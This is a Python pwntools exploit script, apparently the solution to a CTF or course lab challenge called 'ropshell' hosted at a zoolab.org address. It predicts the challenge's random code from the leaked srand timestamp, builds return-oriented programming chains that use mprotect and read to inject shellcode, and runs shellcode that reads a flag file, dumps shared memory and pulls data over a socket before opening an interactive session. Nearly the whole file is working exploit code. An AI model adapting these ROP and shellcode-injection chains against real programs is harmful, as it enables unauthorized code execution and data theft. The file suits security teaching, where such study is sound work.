#!/usr/bin/env python3
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]

import os
import sys
sys.path.insert(0, os.path.normpath(os.path.join(__file__, '../../../pow')))

from pwn import *
import ctypes

exe = context.binary = ELF('./ropshell')
libc = ctypes.CDLL('libc.so.6')

LEN_CODE = 10*0x10000
LEN_STACK = 8192

def createIO():
    io = None
    if args.REMOTE:
        io = remote("up23.zoolab.org", 10494)
        __import__('pow').solve_pow(io)
        io.readline()
        io.readline()
    elif args.QEMU:
        io = process("qemu-x86_64-static ./ropshell", shell=True)
    else:
        io = process("./ropshell", shell=False)
    return io

def gencode(timestamp):
    libc.srand(timestamp)
    codeint = [
        int(((libc.rand() & 0xffff) << 16) | (libc.rand() & 0xffff))
        for _ in range(LEN_CODE // 4)
    ]
    syscall = libc.rand() % (LEN_CODE//4 - 1)
    codeint[syscall] = 0xc3050f
    code = b''.join(p32(x) for x in codeint)
    return code, syscall

if __name__ == '__main__':
    io = createIO()
    timestamp = int(io.readline().split()[-1])
    codeaddr = int(io.readline().split()[-1], 16)
    info(f'timestamp = {timestamp}')
    info(f'code = {hex(codeaddr)}')

    code, syscall = gencode(timestamp)
    binary = ELF.from_bytes(code, vma = codeaddr)

    syscall = codeaddr + syscall * 4

    rop = ROP(binary)
    rop(rax = constants.SYS_exit, rdi = 37)
    rop.raw(syscall)
    print(rop.dump())
    io.sendlineafter(b'> ', rop.chain())
    print(io.readuntil(b'shell', drop=True).decode())

    def work(sc):
        rop = ROP(binary)
        rop(
            rax = constants.SYS_mprotect,
            rdi = codeaddr,
            rsi = 4096 * 2,
            rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
        )
        rop.raw(syscall)
        rop(
            rax = constants.SYS_read,
            rdi = 0,
            rsi = codeaddr,
            rdx = 4096,
        )
        rop.raw(syscall)
        rop.raw(codeaddr)
        io.sendlineafter(b'> ', rop.chain())
        io.sendline(asm(sc))
        print(io.readuntil(b'shell', drop=True).decode())

    buf = codeaddr+4096
    key = 0x1337

    # context.log_level = 'debug'

    sc = ''.join([
        shellcraft.open('/FLAG\0'),
        shellcraft.read('rax', buf, 1024),
        shellcraft.write(1, 'rsi', 'rax'),
        shellcraft.exit(0),
    ])
    work(sc)

    constants.SHM_RDONLY = 0x1000
    sc = ''.join([
        shellcraft.shmget(key, 4096, 0),
        shellcraft.shmat('rax', 0, constants.SHM_RDONLY),
        shellcraft.write(1, 'rax', 1024),
        shellcraft.exit('rax'),
    ])
    work(sc)

    sc = ''.join([
        shellcraft.connect('127.0.0.1', key),
        shellcraft.read(3, buf, 1024),
        shellcraft.write(1, 'rsi', 'rax'),
        shellcraft.exit('rax'),
    ])
    work(sc)

    io.interactive()

